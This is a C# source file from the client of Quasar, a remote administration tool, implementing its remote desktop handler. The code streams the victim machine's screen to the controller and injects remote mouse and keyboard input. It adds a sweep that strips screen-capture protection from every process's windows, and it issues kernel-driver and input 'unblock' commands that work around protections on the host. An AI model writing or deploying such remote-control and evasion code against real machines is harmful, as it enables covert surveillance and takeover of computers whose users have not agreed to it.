using Quasar.Client.Helper;
using Quasar.Client.Logging;
using Quasar.Client.RemoteDesktop;
using Quasar.Client.RemoteDesktop.Driver;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Video;
using Quasar.Common.Video.Codecs;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using System.Threading;

namespace Quasar.Client.Messages
{
    public class RemoteDesktopHandler : NotificationMessageProcessor, IDisposable
    {
        private readonly KernelDriverLogger _driverLogger;
        private readonly KernelUnblockCommand _kernelUnblock;
        private readonly KernelDriverManager _driverManager;
        private readonly InputUnblockCommand _inputUnblock;
        private UnsafeStreamCodec _streamCodec;
        private KernelDriverState _currentDriverState = KernelDriverState.Unknown;
        private string _driverVersion = string.Empty;
        private long _nextFrameId;
        private long _frameCounter;

        public RemoteDesktopHandler()
        {
            _driverLogger = new KernelDriverLogger();
            _kernelUnblock = new KernelUnblockCommand(_driverLogger);
            _driverManager = new KernelDriverManager(_driverLogger);
            _inputUnblock = new InputUnblockCommand(_driverLogger);
        }

        public override bool CanExecute(IMessage message) => message is GetDesktop ||
                                                             message is DoMouseEvent ||
                                                             message is DoKeyboardEvent ||
                                                             message is GetMonitors ||
                                                             message is DoKernelUnblock ||
                                                             message is GetKernelDriverStatus ||
                                                             message is DoInputUnblock;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetDesktop msg:
                    Execute(sender, msg);
                    break;
                case DoMouseEvent msg:
                    Execute(sender, msg);
                    break;
                case DoKeyboardEvent msg:
                    Execute(sender, msg);
                    break;
                case GetMonitors msg:
                    Execute(sender, msg);
                    break;
                case DoKernelUnblock msg:
                    Execute(sender, msg);
                    break;
                case GetKernelDriverStatus msg:
                    Execute(sender, msg);
                    break;
                case DoInputUnblock msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetDesktop message)
        {
            // TODO: Switch to streaming mode without request-response once switched from windows forms
            // TODO: Capture mouse in frames: https://stackoverflow.com/questions/6750056/how-to-capture-the-screen-and-mouse-pointer-using-windows-apis
            var monitorBounds = ScreenHelper.GetBounds((message.DisplayIndex));
            var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };

            if (_streamCodec == null)
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

            if (message.CreateNew)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
                OnReport("Remote desktop session started");
            }

            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
            {
                _streamCodec?.Dispose();

                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            if (message.ForceAffinityReset)
                ResetAllWindowAffinities();

            var driverStatus = _driverManager.GetStatus(false);
            _currentDriverState = driverStatus.State;
            _driverVersion = driverStatus.Version ?? _driverVersion;
            long frameId = Interlocked.Increment(ref _nextFrameId);

            BitmapData desktopData = null;
            Bitmap desktop = null;
            try
            {
                desktop = ScreenHelper.CaptureScreen(new ScreenHelper.CaptureOptions
                {
                    DisplayIndex = message.DisplayIndex,
                    IncludeCursor = message.IncludeCursor
                });
                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                    ImageLockMode.ReadWrite, desktop.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                    _streamCodec.CodeImage(desktopData.Scan0,
                        new Rectangle(0, 0, desktop.Width, desktop.Height),
                        new Size(desktop.Width, desktop.Height),
                        desktop.PixelFormat, stream);
                    client.Send(new GetDesktopResponse
                    {
                        Image = stream.ToArray(),
                        Quality = _streamCodec.ImageQuality,
                        Monitor = _streamCodec.Monitor,
                        Resolution = _streamCodec.Resolution,
                        DriverState = driverStatus.State,
                        FrameId = frameId
                    });
                }
            }
            catch (Exception)
            {
                if (_streamCodec != null)
                {
                    client.Send(new GetDesktopResponse
                    {
                        Image = null,
                        Quality = _streamCodec.ImageQuality,
                        Monitor = _streamCodec.Monitor,
                        Resolution = _streamCodec.Resolution,
                        DriverState = driverStatus.State,
                        FrameId = frameId
                    });
                }

                _streamCodec = null;
            }
            finally
            {
                if (desktop != null)
                {
                    if (desktopData != null)
                    {
                        try
                        {
                            desktop.UnlockBits(desktopData);
                        }
                        catch
                        {
                        }
                    }
                    desktop.Dispose();
                }
            }
        }

        private void Execute(ISender sender, DoMouseEvent message)
        {
            try
            {
                Screen[] allScreens = Screen.AllScreens;
                int offsetX = allScreens[message.MonitorIndex].Bounds.X;
                int offsetY = allScreens[message.MonitorIndex].Bounds.Y;
                Point p = new Point(message.X + offsetX, message.Y + offsetY);

                // Disable screensaver if active before input
                switch (message.Action)
                {
                    case MouseAction.LeftDown:
                    case MouseAction.LeftUp:
                    case MouseAction.RightDown:
                    case MouseAction.RightUp:
                    case MouseAction.MoveCursor:
                        if (NativeMethodsHelper.IsScreensaverActive())
                            NativeMethodsHelper.DisableScreensaver();
                        break;
                }

                switch (message.Action)
                {
                    case MouseAction.LeftDown:
                    case MouseAction.LeftUp:
                        NativeMethodsHelper.DoMouseLeftClick(p, message.IsMouseDown);
                        break;
                    case MouseAction.RightDown:
                    case MouseAction.RightUp:
                        NativeMethodsHelper.DoMouseRightClick(p, message.IsMouseDown);
                        break;
                    case MouseAction.MoveCursor:
                        NativeMethodsHelper.DoMouseMove(p);
                        break;
                    case MouseAction.ScrollDown:
                        NativeMethodsHelper.DoMouseScroll(p, true);
                        break;
                    case MouseAction.ScrollUp:
                        NativeMethodsHelper.DoMouseScroll(p, false);
                        break;
                }
            }
            catch
            {
            }
        }

        private void Execute(ISender sender, DoKeyboardEvent message)
        {
            if (NativeMethodsHelper.IsScreensaverActive())
                NativeMethodsHelper.DisableScreensaver();

            NativeMethodsHelper.DoKeyPress(message.Key, message.KeyDown);
        }

        private void Execute(ISender client, GetMonitors message)
        {
            client.Send(new GetMonitorsResponse {Number = Screen.AllScreens.Length});
        }

        private void ResetAllWindowAffinities()
        {
            try
            {
                int attempted = 0;
                int reset = 0;
                int failures = 0;

                foreach (var process in Process.GetProcesses())
                {
                    try
                    {
                        foreach (var handle in NativeMethodsHelper.EnumerateProcessWindows(process.Id, includeChildWindows: true))
                        {
                            attempted++;
                            var result = NativeMethodsHelper.ResetWindowDisplayAffinity(handle, skipIfAlreadyReset: false, out var error);
                            if (result == NativeMethodsHelper.WindowAffinityResetResult.ResetPerformed)
                                reset++;
                            else if (result == NativeMethodsHelper.WindowAffinityResetResult.Failed)
                            {
                                failures++;
                                if (error != 0)
                                    _driverLogger.Warning($"Force affinity reset failed for handle 0x{handle.ToInt64():X}: 0x{error:X}");
                            }
                        }
                    }
                    catch
                    {
                        // Skip processes we cannot inspect (system services, etc.).
                    }
                    finally
                    {
                        process.Dispose();
                    }
                }

                _driverLogger.Info($"Force affinity reset sweep completed: attempted={attempted}, reset={reset}, failures={failures}.");
            }
            catch (Exception ex)
            {
                _driverLogger.Warning($"Force affinity reset failed: {ex.Message}");
            }
        }

        private void Execute(ISender client, DoKernelUnblock message)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    var driverState = _driverManager.EnsureState(message.DriverAction);
                    _currentDriverState = driverState;
                    var result = _kernelUnblock.Execute(message, driverState);
                    client.Send(result);
                }
                catch (Exception ex)
                {
                    client.Send(new KernelUnblockResult
                    {
                        Result = KernelUnblockResultCode.Failed,
                        ProcessName = message.ProcessName,
                        DriverState = _currentDriverState,
                        Message = ex.Message
                    });
                }
            });
        }

        private void Execute(ISender client, GetKernelDriverStatus message)
        {
            var driverState = _driverManager.EnsureState(message.DriverAction);
            _currentDriverState = driverState;

            var status = _driverManager.GetStatus(message.ForceRefresh);
            _currentDriverState = status.State;
            _driverVersion = status.Version ?? string.Empty;
            client.Send(status);
        }

        private void Execute(ISender client, DoInputUnblock message)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    var result = _inputUnblock.Execute(message);
                    client.Send(result);
                }
                catch (Exception ex)
                {
                    client.Send(new InputUnblockResult
                    {
                        ResultCode = InputUnblockResultCode.Failed,
                        MouseUnlocked = message.UnblockMouse,
                        KeyboardUnlocked = message.UnblockKeyboard,
                        Message = ex.Message,
                        DurationMilliseconds = 0
                    });
                }
            });
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _streamCodec?.Dispose();
            }
        }
    }
}
